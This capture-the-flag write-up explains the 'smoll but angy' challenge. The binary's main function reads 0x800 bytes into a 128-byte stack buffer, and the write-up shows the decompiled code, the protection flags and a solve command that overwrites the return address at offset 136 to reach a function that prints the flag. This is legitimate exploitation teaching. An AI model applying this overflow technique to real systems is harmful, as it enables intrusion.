# smoll but angy

> The seas be vast, but even the smallest squall can sink the mightiest ship. A pirate's fury be swift, and only the cleverest scallywag can slip past his wrath. Ye best be minding where ye step, or he'll send ye straight to Davy Jones’ locker!
> 
> Author: OS1R1S

## Solution
This question is very simple, it's a bummer I didn't try during the  competition. It's a ret2win challenge. Disassemble the binary and you can see in the main function, there is fgets that will take 0x800 bytes into local_88. But, the problem is local_88 only has 128 bytes of buffer. Thus, this can lead to buffer overflow. 

```
undefined4 main(void)

{
  char local_88 [128];
  
  setbuf((FILE *)stdin,(char *)0x0);
  setbuf((FILE *)stdout,(char *)0x0);
  setbuf((FILE *)stderr,(char *)0x0);
  puts("You dare challenge me?");
  fgets(local_88,0x800,(FILE *)stdin);
  puts("Very well, show me what you got!");
  return 0;
}
```

Eventhough there is reported canary, it is not affecting our main function so we can easily overflow the buffer without dealing with canary.
```
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

We need to return to `treasure` function which will call `system('cat flag')`.  
```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

void treasure(void)

{
  system("cat flag");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

The exploit is simple, overflow the buffer and rewrite return address with address of treasure.

```
python3 solve.py ./smoll-but-angy --offset 136 --function treasure 
```
## Flag
![image](https://github.com/user-attachments/assets/645439ef-f90c-4eb5-9d8b-3274d4e43983)
